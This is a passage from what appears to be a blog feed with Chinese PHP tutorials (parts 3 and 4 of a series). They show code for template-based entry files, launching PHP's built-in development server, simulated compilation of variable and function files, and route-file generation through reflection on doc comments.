alt="这里写图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php学习系列4</title>
      <link href="/2017/08/08/%E8%AE%A4%E7%9C%9F%E5%AD%A6%E4%B9%A0php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-4/"/>
      <url>/2017/08/08/%E8%AE%A4%E7%9C%9F%E5%AD%A6%E4%B9%A0php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-4/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="认真学习php面向对象-4"><a href="#认真学习php面向对象-4" class="headerlink" title="认真学习php面向对象-4"></a>认真学习php面向对象-4</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>准备写一个认真学习php面向对象的系列，使用php来做网页，没有深入了解php的话，可能三板斧就够了，并不需要有多高深！如有错误，欢迎各位不吝赐教！进度安排的话，我学到哪里，就更新到哪里了！形式的话就采用一个需求小案例，然后实现，并附上自己的总结，<a href="https://github.com/shisiying/phpOrinentedObject/tree/master" target="_blank" rel="noopener">文章源码</a></p><h3 id="需求-：1-模拟生成路由资源文件"><a href="#需求-：1-模拟生成路由资源文件" class="headerlink" title="需求 ：1)模拟生成路由资源文件"></a><strong>需求 ：1)模拟生成路由资源文件</strong></h3><p>我们经常使用框架的时候经常会接触到路由这个概念，今天我们就来模拟简单的路由资源文件的创建，探讨路由资源文件是怎么生成的。</p><h4 id="解决-get-declared-classes-，CLASS，array-search以及反射ReflectionClass，getDocComment的使用"><a href="#解决-get-declared-classes-，CLASS，array-search以及反射ReflectionClass，getDocComment的使用" class="headerlink" title="解决 : get_declared_classes()，CLASS，array_search以及反射ReflectionClass，getDocComment的使用"></a><strong>解决 : get_declared_classes()，<strong>CLASS</strong>，array_search以及反射ReflectionClass，getDocComment的使用</strong></h4><p>上述函数不懂可以在官网寻找其用法</p><h4 id="创建index-php"><a href="#创建index-php" class="headerlink" title="创建index.php "></a><strong>创建index.php </strong></h4><p>   <img src="http://img.blog.csdn.net/20170808170558627?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="god-frame-php"><a href="#god-frame-php" class="headerlink" title="god_frame.php "></a><strong>god_frame.php </strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//获取所有已加载的所有类</span><br><span class="line">      <span class="variable">$class_set</span>=get_declared_classes();</span><br><span class="line">      <span class="variable">$class_set</span>=array_slice(<span class="variable">$class_set</span>,array_search(__CLASS__,<span class="variable">$class_set</span>)+1);</span><br><span class="line">      <span class="variable">$result</span>=array();</span><br><span class="line">      foreach (<span class="variable">$class_set</span> as <span class="variable">$class</span>) &#123;</span><br><span class="line">          <span class="variable">$mvc</span>=new god_mvc(<span class="variable">$class</span>);</span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$mvc</span>-&gt;isController()) &#123;</span><br><span class="line">              <span class="variable">$mp</span>=<span class="variable">$mvc</span>-&gt;getRequestMappings();</span><br><span class="line">              <span class="variable">$result</span>=array_merge(<span class="variable">$result</span>,<span class="variable">$mp</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      //生成路由文件</span><br><span class="line">      file_put_contents(<span class="variable">$this</span>-&gt;project_folder.<span class="string">'/request_route'</span>,<span class="string">'&lt;?php return '</span>.var_export(<span class="variable">$result</span>,1).<span class="string">';'</span>);</span><br></pre></td></tr></table></figure><h4 id="新增类god-mvc-php"><a href="#新增类god-mvc-php" class="headerlink" title="新增类god_mvc.php "></a><strong>新增类god_mvc.php </strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace core\frame;</span><br><span class="line">class god_mvc</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$classComment</span>=<span class="string">""</span>;</span><br><span class="line">    public <span class="variable">$classMethods</span>=array();</span><br><span class="line">    public <span class="variable">$className</span>=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">function</span> __construct(<span class="variable">$cname</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;className=<span class="variable">$cname</span>;</span><br><span class="line">        <span class="variable">$Rf</span>=new \ReflectionClass((<span class="variable">$cname</span>));</span><br><span class="line">        <span class="variable">$this</span>-&gt;classComment=<span class="variable">$Rf</span>-&gt;getDocComment();//获取类的注释</span><br><span class="line">        <span class="variable">$this</span>-&gt;classMethods=<span class="variable">$Rf</span>-&gt;getMethods();//获取类里面的所有方法集合，返回一个方法对象数组</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> isController()</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="built_in">return</span> preg_match(<span class="string">"/@Controller/"</span>,<span class="variable">$this</span>-&gt;classComment);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> getRequestMappings()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$result</span>=array();</span><br><span class="line">        foreach (<span class="variable">$this</span>-&gt;classMethods as <span class="variable">$method</span>) &#123;</span><br><span class="line"></span><br><span class="line">             <span class="variable">$get_res</span>=<span class="variable">$this</span>-&gt;getRequestMappingsResult(<span class="variable">$method</span>);</span><br><span class="line">             <span class="keyword">if</span>(<span class="variable">$get_res</span>)&#123;</span><br><span class="line">                 <span class="variable">$result</span>=array_merge(<span class="variable">$result</span>,<span class="variable">$get_res</span>);</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> getRequestMappingsResult(<span class="variable">$m</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (preg_match(<span class="string">'/@RequestMapping\("(?&lt;RequestUrl&gt;.&#123;3,20&#125;)",Method=(?&lt;RequestMethod&gt;\w&#123;3,8&#125;)\)/'</span>,<span class="variable">$m</span>-&gt;getDocComment(),<span class="variable">$result</span>)) &#123;</span><br><span class="line">             <span class="built_in">return</span> array(</span><br><span class="line">                 <span class="variable">$result</span>[<span class="string">'RequestUrl'</span>]=&gt;array(</span><br><span class="line">                     <span class="string">'RequestMethod'</span>=&gt;<span class="variable">$result</span>[<span class="string">'RequestMethod'</span>],</span><br><span class="line">                     <span class="string">'Class'</span>=&gt;<span class="variable">$this</span>-&gt;className,</span><br><span class="line">                     <span class="string">'Method'</span>=&gt;<span class="variable">$m</span>-&gt;getName()</span><br><span class="line">                 )</span><br><span class="line">             );</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="效果"><a href="#效果" class="headerlink" title="效果 : "></a><strong>效果 : </strong></h4><p><img src="http://img.blog.csdn.net/20170808171003686?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php学习系列3</title>
      <link href="/2017/08/07/%E8%AE%A4%E7%9C%9F%E5%AD%A6%E4%B9%A0php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-3/"/>
      <url>/2017/08/07/%E8%AE%A4%E7%9C%9F%E5%AD%A6%E4%B9%A0php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-3/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="认真学习php面向对象-3"><a href="#认真学习php面向对象-3" class="headerlink" title="认真学习php面向对象-3"></a>认真学习php面向对象-3</h1><h3 id="前言"><a href="#前言" class="headerlink" title=" 前言 "></a><strong> 前言 </strong></h3><p>准备写一个认真学习php面向对象的系列，使用php来做网页，没有深入了解php的话，可能三板斧就够了，并不需要有多高深！如有错误，欢迎各位不吝赐教！进度安排的话，我学到哪里，就更新到哪里了！形式的话就采用一个需求小案例，然后实现，并附上自己的总结,<a href="https://github.com/shisiying/phpOrinentedObject/tree/master" target="_blank" rel="noopener">文章源码</a></p><h3 id="所用到的环境"><a href="#所用到的环境" class="headerlink" title=" 所用到的环境 "></a><strong> 所用到的环境 </strong></h3><p>系统:ubuntu16.04<br>编辑器:phpstorm2017<br>php7</p><h3 id="需求-：1-使用自定义模板创建入口文件"><a href="#需求-：1-使用自定义模板创建入口文件" class="headerlink" title="需求 ：1)使用自定义模板创建入口文件"></a><strong>需求 ：1)使用自定义模板创建入口文件</strong></h3><h4 id="解决-ob-start以及get-object-vars和extract的使用"><a href="#解决-ob-start以及get-object-vars和extract的使用" class="headerlink" title="解决 : ob_start以及get_object_vars和extract的使用"></a><strong>解决 : ob_start以及get_object_vars和extract的使用</strong></h4><ol><li><p>ob_start</p><blockquote><p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中</p></blockquote><p>我们可以使用此函数加载自定义的模板文件，但并没有输出到屏幕中，而是用变量获取数据，并将数据写入到创建的入口文件当中</p></li><li><p>get_object_vars</p><blockquote><p>返回由对象属性组成的关联数组<br>可以获取该对象的属性值，并创建用户输入的参数文件目录以及写入用户的数据</p></blockquote></li><li><p>extract</p><blockquote><p>从数组中将变量导入到当前的符号表,可以将数组直接转换成变量（$key）=值（$value）</p></blockquote></li></ol><h4 id="实现"><a href="#实现" class="headerlink" title="实现 : "></a><strong>实现 : </strong></h4><h4 id="创建自定义模板文件（template文件下创建index-tpl）"><a href="#创建自定义模板文件（template文件下创建index-tpl）" class="headerlink" title="创建自定义模板文件（template文件下创建index.tpl）"></a><strong>创建自定义模板文件（template文件下创建index.tpl）</strong></h4><h4 id="index-tpl"><a href="#index-tpl" class="headerlink" title="index.tpl"></a><strong>index.tpl</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">echo</span> <span class="string">'&lt;?php'</span> ?&gt;</span><br><span class="line">/**</span><br><span class="line"> * project name &lt;?php <span class="built_in">echo</span> <span class="variable">$prj_name</span>?&gt;</span><br><span class="line"> * user &lt;?php <span class="built_in">echo</span> <span class="variable">$author</span>?&gt;</span><br><span class="line"> * date &lt;?php <span class="built_in">echo</span> date(<span class="string">'Y-m-d'</span>)?&gt;</span><br><span class="line"> */</span><br></pre></td></tr></table></figure><h4 id="写入模板文件所需要的变量值"><a href="#写入模板文件所需要的变量值" class="headerlink" title="写入模板文件所需要的变量值"></a><strong>写入模板文件所需要的变量值</strong></h4><h4 id="god-class-hp"><a href="#god-class-hp" class="headerlink" title="god_class.hp"></a><strong>god_class.hp</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">static <span class="keyword">function</span> <span class="function"><span class="title">start</span></span>() &#123;</span><br><span class="line">          <span class="variable">$config</span>=loadconfig();</span><br><span class="line">          <span class="variable">$ff</span>=new god_frame(<span class="variable">$config</span>-&gt;prj_name);</span><br><span class="line">          <span class="variable">$ff</span>-&gt;prj_name=<span class="variable">$config</span>-&gt;prj_name;</span><br><span class="line">          <span class="variable">$ff</span>-&gt;author=<span class="variable">$config</span>-&gt;author;</span><br><span class="line">          <span class="variable">$ff</span>-&gt;run();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h4 id="在创建文件目录类对输入的参数处理以及生成模板对应自定义文件"><a href="#在创建文件目录类对输入的参数处理以及生成模板对应自定义文件" class="headerlink" title="在创建文件目录类对输入的参数处理以及生成模板对应自定义文件"></a><strong>在创建文件目录类对输入的参数处理以及生成模板对应自定义文件</strong></h4><h4 id="god-frame-hp"><a href="#god-frame-hp" class="headerlink" title="god_frame.hp"></a><strong>god_frame.hp</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">run</span></span>() &#123;</span><br><span class="line">      !file_exists(<span class="variable">$this</span>-&gt;project_folder) &amp;&amp; mkdir(<span class="variable">$this</span>-&gt;project_folder);</span><br><span class="line">      !file_exists(<span class="variable">$this</span>-&gt;project_main) &amp;&amp; file_put_contents(<span class="variable">$this</span>-&gt;project_main,<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">      extract(get_object_vars(<span class="variable">$this</span>));</span><br><span class="line">      ob_start();</span><br><span class="line">      include (dirname(__FILE__).<span class="string">'/template/index.tpl'</span>);</span><br><span class="line">      <span class="variable">$cnt</span>=ob_get_contents();</span><br><span class="line">      ob_end_clean();</span><br><span class="line">      file_put_contents(<span class="variable">$this</span>-&gt;project_main,<span class="variable">$cnt</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="效果"><a href="#效果" class="headerlink" title="效果 : "></a><strong>效果 : </strong></h4><p><img src="http://img.blog.csdn.net/20170805152528257?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h3 id="需求-：2-使用php内置服务器部署网站，供开发测试使用"><a href="#需求-：2-使用php内置服务器部署网站，供开发测试使用" class="headerlink" title="需求 ：2)使用php内置服务器部署网站，供开发测试使用"></a><strong>需求 ：2)使用php内置服务器部署网站，供开发测试使用</strong></h3><h4 id="解决-system和php命令行启动内置服务器命令"><a href="#解决-system和php命令行启动内置服务器命令" class="headerlink" title="解决 : system和php命令行启动内置服务器命令"></a><strong>解决 : system和php命令行启动内置服务器命令</strong></h4><ol><li><p>system</p><blockquote><p>同 C 版本的 system() 函数一样， 本函数执行 command 参数所指定的命令， 并且输出执行结果。<br>启动php内置服务器</p></blockquote></li><li><p>php启动内置服务器方法</p><blockquote><p>php -S “可以随意设置访问的地址” -t 项目的目录地址<br>如:php -S localhost:8080 -t /home/shisiying/code/phpOrinentedObject/app</p></blockquote></li></ol><h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现 : "></a><strong>实现 : </strong></h4><h4 id="使用system函数进行执行"><a href="#使用system函数进行执行" class="headerlink" title="使用system函数进行执行"></a><strong>使用system函数进行执行</strong></h4><h4 id="god-frame-hp-1"><a href="#god-frame-hp-1" class="headerlink" title="god_frame.hp"></a><strong>god_frame.hp</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">run</span></span>() &#123;</span><br><span class="line">       !file_exists(<span class="variable">$this</span>-&gt;project_folder) &amp;&amp; mkdir(<span class="variable">$this</span>-&gt;project_folder);</span><br><span class="line">       !file_exists(<span class="variable">$this</span>-&gt;project_main) &amp;&amp; file_put_contents(<span class="variable">$this</span>-&gt;project_main,<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">       extract(get_object_vars(<span class="variable">$this</span>));</span><br><span class="line">       ob_start();</span><br><span class="line">       include (dirname(__FILE__).<span class="string">'/template/index.tpl'</span>);</span><br><span class="line">       <span class="variable">$cnt</span>=ob_get_contents();</span><br><span class="line">       ob_end_clean();</span><br><span class="line">       file_put_contents(<span class="variable">$this</span>-&gt;project_main,<span class="variable">$cnt</span>);</span><br><span class="line"></span><br><span class="line">       <span class="built_in">echo</span> <span class="string">"the server is running!"</span>;</span><br><span class="line">       system(<span class="string">"php -S localhost:8080 -t /home/shisiying/code/phpOrinentedObject/app"</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="效果-1"><a href="#效果-1" class="headerlink" title="效果 : "></a><strong>效果 : </strong></h4><p><img src="http://img.blog.csdn.net/20170805154012359?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>其中it works在生成的后续添加的，方便观察效果<br><img src="http://img.blog.csdn.net/20170805154021808?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h3 id="需求-：3-对只写变量的文件模拟编译"><a href="#需求-：3-对只写变量的文件模拟编译" class="headerlink" title="需求 ：3)对只写变量的文件模拟编译"></a><strong>需求 ：3)对只写变量的文件模拟编译</strong></h3><h4 id="解决-scandir和get-defined-vars-和var-export的使用"><a href="#解决-scandir和get-defined-vars-和var-export的使用" class="headerlink" title="解决 : scandir和get_defined_vars()和var_export的使用"></a><strong>解决 : scandir和get_defined_vars()和var_export的使用</strong></h4><ol><li><p>scandir</p><blockquote><p>列出指定路径中的文件和目录</p></blockquote></li><li><p>get_defined_vars</p><blockquote><p>返回由所有已定义变量所组成的数组</p></blockquote></li><li><p>var_export</p><blockquote><p>输出或返回一个变量的字符串表示,函数的第二个参数设置为 TRUE，从而返回变量的表示。</p></blockquote></li></ol><h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现 : "></a><strong>实现 : </strong></h4><h4 id="创建一个文件"><a href="#创建一个文件" class="headerlink" title="创建一个文件"></a><strong>创建一个文件</strong></h4><p><img src="http://img.blog.csdn.net/20170806233051569?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id=""><a href="#" class="headerlink" title="**"></a><em>**</em></h4><h4 id="god-frame-php"><a href="#god-frame-php" class="headerlink" title="god_frame.php"></a><strong>god_frame.php</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">compile</span></span>() &#123;</span><br><span class="line">       <span class="variable">$_files</span>=scandir(<span class="variable">$this</span>-&gt;project_folder.<span class="string">'/code'</span>);</span><br><span class="line">       foreach (<span class="variable">$_files</span> as <span class="variable">$_file</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (preg_match(<span class="string">"/\w+\.var\.php$/i"</span>,<span class="variable">$_file</span>)) &#123;</span><br><span class="line">               require (<span class="variable">$this</span>-&gt;project_folder.<span class="string">'/code/'</span>.<span class="variable">$_file</span>);</span><br><span class="line">               <span class="built_in">unset</span>(<span class="variable">$_file</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="built_in">unset</span>(<span class="variable">$_files</span>);</span><br><span class="line">       <span class="variable">$result</span>=<span class="string">'&lt;?php'</span>.PHP_EOL</span><br><span class="line">               .<span class="string">'extract('</span>.var_export(get_defined_vars(),1).<span class="string">');'</span>;</span><br><span class="line">       file_put_contents(<span class="variable">$this</span>-&gt;project_folder.<span class="string">'/vars'</span>,<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="god-class-php"><a href="#god-class-php" class="headerlink" title="god_class.php"></a><strong>god_class.php</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//模拟编译</span><br><span class="line">    static <span class="keyword">function</span> <span class="function"><span class="title">compile</span></span>() &#123;</span><br><span class="line">        <span class="variable">$config</span>=loadconfig();</span><br><span class="line">        <span class="variable">$gf</span>=new god_frame(<span class="variable">$config</span>-&gt;prj_name);</span><br><span class="line">        <span class="variable">$gf</span>-&gt;compile();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>####<strong>效果 : </strong><br><img src="http://img.blog.csdn.net/20170807094605400?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h3 id="需求-：4-对只写函数的文件模拟编译"><a href="#需求-：4-对只写函数的文件模拟编译" class="headerlink" title="需求 ：4)对只写函数的文件模拟编译"></a><strong>需求 ：4)对只写函数的文件模拟编译</strong></h3><h4 id="解决-scandir和get-defined-function-和ReflectionFunction的使用"><a href="#解决-scandir和get-defined-function-和ReflectionFunction的使用" class="headerlink" title="解决 : scandir和get_defined_function()和ReflectionFunction的使用"></a><strong>解决 : scandir和get_defined_function()和ReflectionFunction的使用</strong></h4><ol><li><p>scandir</p><blockquote><p>列出指定路径中的文件和目录</p></blockquote></li><li><p>get_defined_vars</p><blockquote><p>返回由所有已定义变量所组成的数组</p></blockquote></li><li><p>var_export</p><blockquote><p>输出或返回一个变量的字符串表示,函数的第二个参数设置为 TRUE，从而返回变量的表示。</p></blockquote></li><li><p>get_defined_function()</p><blockquote><p>返回所有已定义函数的数组</p></blockquote></li><li><p>ReflectionFunction</p><blockquote><p>报告了一个函数的有关信息。使用方法如下</p></blockquote></li></ol><ol start="6"><li>array_slice<blockquote><p>从数组中取出一段,数组的截取函数</p></blockquote></li><li>implode<blockquote><p>将一个一维数组的值转化为字符串</p></blockquote></li><li>unset<blockquote><p>释放给定的变量</p></blockquote></li></ol><h4 id="实现-3"><a href="#实现-3" class="headerlink" title="实现 : "></a><strong>实现 : </strong></h4><h4 id="创建一个函数文件"><a href="#创建一个函数文件" class="headerlink" title="创建一个函数文件"></a><strong>创建一个函数文件</strong></h4><p><img src="http://img.blog.csdn.net/20170807103511483?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="god-frame-php-1"><a href="#god-frame-php-1" class="headerlink" title="god_frame.php"></a><strong>god_frame.php</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">compile</span></span>() &#123;</span><br><span class="line">      <span class="variable">$_files</span>=scandir(<span class="variable">$this</span>-&gt;project_folder.<span class="string">'/code'</span>);</span><br><span class="line">      foreach (<span class="variable">$_files</span> as <span class="variable">$_file</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (preg_match(<span class="string">"/\w+\.(var|func)\.php$/i"</span>,<span class="variable">$_file</span>)) &#123;</span><br><span class="line">              require (<span class="variable">$this</span>-&gt;project_folder.<span class="string">'/code/'</span>.<span class="variable">$_file</span>);</span><br><span class="line">              <span class="built_in">unset</span>(<span class="variable">$_file</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">unset</span>(<span class="variable">$_files</span>);</span><br><span class="line">      <span class="variable">$result</span>=<span class="string">'&lt;?php'</span>.PHP_EOL</span><br><span class="line">              .<span class="string">'extract('</span>.var_export(get_defined_vars(),1).<span class="string">');'</span>;</span><br><span class="line">      file_put_contents(<span class="variable">$this</span>-&gt;project_folder.<span class="string">'/vars'</span>,<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">      <span class="variable">$funs</span>=get_defined_functions();</span><br><span class="line">      foreach (<span class="variable">$funs</span>[<span class="string">'user'</span>] as <span class="variable">$fun</span>) &#123;</span><br><span class="line">          <span class="variable">$f</span>=new \ReflectionFunction(<span class="variable">$fun</span>);</span><br><span class="line">          <span class="variable">$start</span>=<span class="variable">$f</span>-&gt;getStartLine();</span><br><span class="line">          <span class="variable">$end</span>=<span class="variable">$f</span>-&gt;getEndLine();</span><br><span class="line">          <span class="variable">$fileList</span>=file(<span class="variable">$f</span>-&gt;getFileName());</span><br><span class="line">          <span class="variable">$re</span> = <span class="string">'&lt;?php'</span>.PHP_EOL</span><br><span class="line">                  .implode(array_slice(<span class="variable">$fileList</span>,<span class="variable">$start</span>-1,<span class="variable">$end</span>-<span class="variable">$start</span>+1));</span><br><span class="line">          file_put_contents(<span class="variable">$this</span>-&gt;project_folder.<span class="string">'/func'</span>,<span class="variable">$re</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="效果-2"><a href="#效果-2" class="headerlink" title="效果 : "></a><strong>效果 : </strong></h4><p><img src="http://img.blog.csdn.net/20170807103702632?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h3 id="需求-：5-模拟简单的mvc模式，接收浏览器访问的mv并进行路由简单处理"><a href="#需求-：5-模拟简单的mvc模式，接收浏览器访问的mv并进行路由简单处理" class="headerlink" title="需求 ：5)模拟简单的mvc模式，接收浏览器访问的mv并进行路由简单处理"></a><strong>需求 ：5)模拟简单的mvc模式，接收浏览器访问的mv并进行路由简单处理</strong></h3><h4 id="解决-SERVER-‘PATH-INFO’-和explode的使用"><a href="#解决-SERVER-‘PATH-INFO’-和explode的使用" class="headerlink" title="解决 : $_SERVER[‘PATH_INFO’]和explode的使用"></a><strong>解决 : $_SERVER[‘PATH_INFO’]和explode的使用</strong></h4><h4 id="实现-4"><a href="#实现-4" class="headerlink" title="实现 : "></a><strong>实现 : </strong></h4><h4 id="创建一个class文件"><a href="#创建一个class文件" class="headerlink" title="创建一个class文件"></a><strong>创建一个class文件</strong></h4><p><img src="http://img.blog.csdn.net/20170807115523782?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a><strong>index.php</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 